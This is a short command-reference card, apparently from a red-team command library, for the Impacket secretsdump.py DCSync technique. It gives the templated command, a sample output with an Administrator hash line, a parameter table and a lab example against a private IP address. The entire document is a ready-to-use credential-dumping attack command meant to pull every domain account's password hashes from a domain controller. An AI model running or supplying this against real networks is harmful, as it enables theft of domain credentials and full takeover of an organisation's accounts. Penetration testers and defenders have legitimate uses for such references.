---
id: a87ed429-8db3-4bd4-8424-2ac200c81d5a
name: secretsdump-dcsync
type: command
executor: bash
data: 'secretsdump.py $_DOMAIN/$_USER:$_PASSWORD@$_DC_IP'
output: |-
  [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
  Administrator:500:...:hash:::
created_at: '2020-03-16T01:39:57.837512+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
platforms:
  - Linux
tags:
  - dcsync
  - dumping
verified: true
validated: true
---

# secretsdump-dcsync

## Command

```bash
secretsdump.py $_DOMAIN/$_USER:$_PASSWORD@$_DC_IP
```

## Description

Dumps hashes via DCSync.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_DOMAIN/$_USER:$_PASSWORD | Creds | Yes |
| @$_DC_IP | DC | Yes |

## Examples

### Basic Usage

```bash
secretsdump.py lab/user:pass@192.168.1.10
```

## Expected Output

Hashed credentials listed.
